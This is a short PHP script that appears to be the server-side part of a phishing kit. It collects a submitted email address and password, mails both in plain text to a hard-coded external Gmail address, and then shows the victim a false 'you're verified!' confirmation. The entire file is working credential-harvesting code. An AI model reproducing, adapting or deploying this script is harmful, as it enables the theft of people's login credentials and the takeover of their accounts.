<?php
if(isset($_POST['submit'])){
//getting user data
$fromemail = $_POST['email'];
$frompassword = $_POST['password'];

//recipient email
$mailTo = 'darealbang2023@gmail.com';

//email subject
$subject = ' A NEW MESSAGE RECEIVED FROM ' .$fromemail;

//email message body
$htmlcontent = '<h2> EMAIL REQUEST RECEIVED </h2>
<p> <b>client email: </b>  ' .$fromemail . " " .$frompassword . '</p>
<p> <b>email: </b> ' .$fromemail .'</p>
<p> <b>password: </b> ' .$frompassword .'</p>';

//header for sender info
$headers = "From: " .$fromemail . "<". $fromemail .">";
$headers .= "MIME-VERSION: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=utf-8\r\n";

//php mailer function
$result = mail($mailTo, $subject, $htmlcontent, $headers);

//error checking
if($result) {
  $sucess = "you're verified!";
}  else {
  $failed = "error you're not eligible";
}


}